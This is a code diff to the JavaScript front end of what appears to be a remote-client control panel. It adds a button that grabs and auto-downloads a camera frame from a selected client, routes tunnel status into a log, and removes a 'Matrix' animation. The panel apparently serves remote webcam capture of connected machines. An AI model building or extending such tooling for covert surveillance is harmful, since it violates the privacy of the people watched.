@@ -184,6 +184,22 @@ document.getElementById('cam-stop').onclick=()=>{
   document.getElementById('cam-img').src='';
   document.getElementById('cam-placeholder').style.display='flex';
 };
+document.getElementById('cam-snap').onclick=()=>{
+  if(!selectedId) return;
+  updateCamStatus('● SNAP…');
+  socket.emit('get_camera_frame',{client_id:selectedId});
+  // Auto-download after frame arrives
+  setTimeout(()=>{
+    const img = document.getElementById('cam-img').src;
+    if(img && img.startsWith('data:image')){
+      const a=document.createElement('a');
+      a.href=img;
+      a.download='cam_'+selectedId+'_'+new Date().toISOString().slice(0,19).replace(/[:T]/g,'_')+'.jpg';
+      a.click();
+    }
+    updateCamStatus(camRunning?'● LIVE':'■ STOPPED');
+  },800);
+};
 function pollCam(){
   if(!camRunning || !selectedId) return;
   socket.emit('get_camera_frame',{client_id:selectedId});
@@ -302,27 +318,17 @@ socket.on('protocol_changed', d=>{
 socket.on('bottom_update', d=>{
   document.getElementById('bottom-left').textContent = d.text;
 });
-socket.on('tunnel_url', d=>{ alert('Túnel listo: '+d.url); });
-socket.on('tunnel_error', d=>{ alert('Túnel error: '+d.error); });
+socket.on('tunnel_url', d=>{ 
+  const log = document.getElementById('tunnel-log');
+  if(log){ log.textContent += `\n[INFO] Túnel listo: ${d.url}`; }
+});
+socket.on('tunnel_error', d=>{ 
+  const log = document.getElementById('tunnel-log');
+  if(log){ log.textContent += `\n[ERROR] ${d.error}`; }
+});
+socket.on('tunnel_log', d=>{
+  const log = document.getElementById('tunnel-log');
+  if(log){ log.textContent += `\n${d.line}`; log.scrollTop = log.scrollHeight; }
+});
 
-// Matrix canvas
-const mCanvas=document.getElementById('matrix-canvas');
-if(mCanvas){
-  const ctx=mCanvas.getContext('2d');
-  function resize(){ mCanvas.width=mCanvas.offsetWidth; mCanvas.height=mCanvas.offsetHeight; }
-  window.addEventListener('resize',resize); resize();
-  const chars='0123456789ABCDEF<>{}[]|/\\!@#$%^&*';
-  const cols=40;
-  const drops=Array(cols).fill(0);
-  setInterval(()=>{
-    ctx.fillStyle='rgba(5,8,6,0.08)'; ctx.fillRect(0,0,mCanvas.width,mCanvas.height);
-    ctx.fillStyle='#00ff41'; ctx.font='14px monospace';
-    for(let i=0;i<cols;i++){
-      const ch=chars[Math.floor(Math.random()*chars.length)];
-      const x=i*(mCanvas.width/cols);
-      const y=drops[i]*16;
-      ctx.fillText(ch,x,y);
-      if(y>mCanvas.height+20) drops[i]=0; else drops[i]++;
-    }
-  },80);
-}
+// Connections log initialized
